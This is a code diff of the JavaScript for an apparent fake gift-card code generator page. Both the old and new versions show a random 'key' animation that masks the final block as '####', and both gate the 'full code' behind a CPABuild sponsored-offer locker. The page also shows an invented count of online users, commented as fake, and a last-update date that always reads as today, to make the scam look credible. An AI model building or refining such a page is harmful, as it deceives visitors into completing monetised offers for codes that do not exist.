-                '1683515574519de4f41af72361cdc267ddb04ea418.png',
-                '168351557317debab7cd0529195a1bd0f29aa07902.png',
-                '168351557339e3880a6a59b3ce405f9a101166b46a.png',
-                '1688881990e56e48dac9cfc02dcccbebcae8315b37.png',
-                '1688881988cd9bbe2303211f05f847dd99f8d9ffb9.png',
-                '1688881988d472c750c492bb306446f181d96b785d.png',
-                '1683515588d9add22281c8e75444fe5ae9fa465d51.png'
-            ];
+        // Auto update date
+        function updateDate() {
+            var now = new Date();
+            var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+            var day = now.getDate();
+            var month = months[now.getMonth()];
+            var year = now.getFullYear();
+            document.getElementById("update-date").innerHTML = month + " " + (day < 10 ? "0" + day : day) + " " + year;
+        }
+        updateDate();
 
-            cardKeys.forEach((key, idx) => {
-                const num = idx + 1;
-                const div = document.createElement('div');
-                div.className = 'card-item';
-                div.id = 'card' + num;
-                const img = document.createElement('img');
-                img.src = baseUrl + key;
-                img.alt = 'gift card';
-                img.loading = 'lazy';
-                div.appendChild(img);
-                div.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    card(num);
-                });
-                cardGrid.appendChild(div);
-            });
+        // Fake online users - random between 250-380
+        function updateOnlineUsers() {
+            var users = Math.floor(Math.random() * 130) + 250;
+            document.getElementById("user-online").innerHTML = users;
+        }
+        updateOnlineUsers();
+        setInterval(updateOnlineUsers, 5000);
 
-            // card selection function
-            window.card = function(cardnum) {
-                const box = document.getElementById('download');
-                box.style.display = 'block';
-                // remove selected from all
-                document.querySelectorAll('.card-item').forEach(el => el.classList.remove('selected'));
-                const target = document.getElementById('card' + cardnum);
-                if (target) target.classList.add('selected');
-                const img = document.getElementById('imggen');
-                const src = target ? target.querySelector('img')?.src : '';
-                if (src) img.src = src;
-                // reset to step1 if visible
-                document.getElementById('step1').classList.remove('hidden');
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('button1').style.display = 'none';
-                // reset header visibility
-                document.getElementById('header').classList.remove('header-hidden');
-            };
+        function card(cardnum) {
+            document.getElementById("download").style.display = "block";
+            for (var i = 1; i <= 44; i++) {
+                document.getElementById("card" + i).classList.remove("selectedcard");
+            }
+            document.getElementById("card" + cardnum).classList.add("selectedcard");
+            document.getElementById("imggen").src = document.getElementById("card" + cardnum).src;
+        }
 
-            // default select first card
-            window.onload = function() {
-                if (document.getElementById('card1')) card(1);
-                updateDate();
-                updateOnlineUsers();
-                setInterval(updateOnlineUsers, 5000);
-            };
-
-            // ----- date & online -----
-            window.updateDate = function() {
-                const now = new Date();
-                const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
-                const day = String(now.getDate()).padStart(2, '0');
-                const month = months[now.getMonth()];
-                const year = now.getFullYear();
-                document.getElementById('update-date').textContent = month + ' ' + day + ' ' + year;
-            };
-
-            window.updateOnlineUsers = function() {
-                const users = Math.floor(Math.random() * 130) + 250;
-                document.getElementById('user-online').textContent = users;
-            };
-
-            // ----- step 2: key generator -----
-            window.showGenStep = function() {
-                document.getElementById('header').classList.add('header-hidden');
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('appbox').style.display = 'none';
-
-                const KeyCode = ['9','8','7','6','5','4','3','2','1','0','A','B','C','D','E','F','G','H','I','J','K','L','Z','Y','X','W','V','U','T','S','R','Q','P','O','N','M'];
-                let stop = 0;
-                const interval = setInterval(() => {
-                    let key = '';
-                    for (let i = 0; i < 36; i++) key += KeyCode[Math.floor(Math.random() * 36)];
-                    const display = key[5]+key[6]+key[7]+key[8]+'-'+
-                                    key[10]+key[11]+key[12]+key[13]+'-'+
-                                    key[15]+key[16]+key[17]+key[18]+'-'+
-                                    key[20]+key[21]+key[22]+key[23];
-                    document.getElementById('Gentext').textContent = display;
-                    stop++;
-                    if (stop >= 40) {
-                        clearInterval(interval);
-                        // final with ####
-                        const finalKey = key[5]+key[6]+key[7]+key[8]+'-'+
-                                         key[10]+key[11]+key[12]+key[13]+'-'+
-                                         key[15]+key[16]+key[17]+key[18]+'-####';
-                        document.getElementById('Gentext').textContent = finalKey;
-                        document.getElementById('button1').style.display = 'inline-block';
-                        document.getElementById('Gentext1').classList.remove('hidden');
-                    }
-                }, 40);
-            };
-
-            // expose _bC for locker
-            window._bC = function() {
-                // CPABuild locker is called via onclick
-                if (typeof CPBContentLocker !== 'undefined') {
-                    // locker will handle
+        // STEP 1: Click Get Now! → shows key generator + Verify button
+        function showGenStep() {
+            // Hide header when Step 2 starts
+            document.getElementById("header").classList.add("header-hidden");
+            
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("appbox").style.display = "none";
+            document.getElementById("Gentext").style.display = "block";
+            
+            var myVarCode = setInterval(genkey, 40);
+            var stop = 0;
+            var KeyCode = ["9", "8", "7", "6", "5", "4", "3", "2", "1", "0", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "Z", "Y", "X", "W", "V", "U", "T", "S", "R", "Q", "P", "O", "N", "M"];
+            
+            function genkey() {
+                var key = "";
+                for (var i = 0; i < 36; i++) {
+                    key += KeyCode[Math.floor(Math.random() * 36)];
                 }
-                // fallback: just show alert (but locker should handle)
-                alert('🔐 Complete the sponsored activity to reveal the full code.');
-            };
+                
+                document.getElementById("Gentext").innerHTML = 
+                    key[5] + key[6] + key[7] + key[8] + "-" + 
+                    key[10] + key[11] + key[12] + key[13] + "-" + 
+                    key[15] + key[16] + key[17] + key[18] + "-" + 
+                    key[20] + key[21] + key[22] + key[23];
+                
+                stop++;
+                if (stop == 40) {
+                    document.getElementById("Gentext").innerHTML = 
+                        key[5] + key[6] + key[7] + key[8] + "-" + 
+                        key[10] + key[11] + key[12] + key[13] + "-" + 
+                        key[15] + key[16] + key[17] + key[18] + "-" + "####";
+                    document.getElementById("button1").style.display = "block";
+                    document.getElementById("Gentext1").style.display = "block";
+                    clearInterval(myVarCode);
+                }
+            }
+        }
 
-            // keep header-hidden class
-            const style = document.createElement('style');
-            style.textContent = `.header-hidden { display: none !important; }`;
-            document.head.appendChild(style);
-        })();
-    </script>
-    <!-- google translate init (minimal) -->
-    <script>
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+        if(typeof window.ga === 'function'){
+            ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+            ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+            ga('customTemplateGlobal.send', 'pageView');
         }
     </script>
-    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
 </body>
 </html>
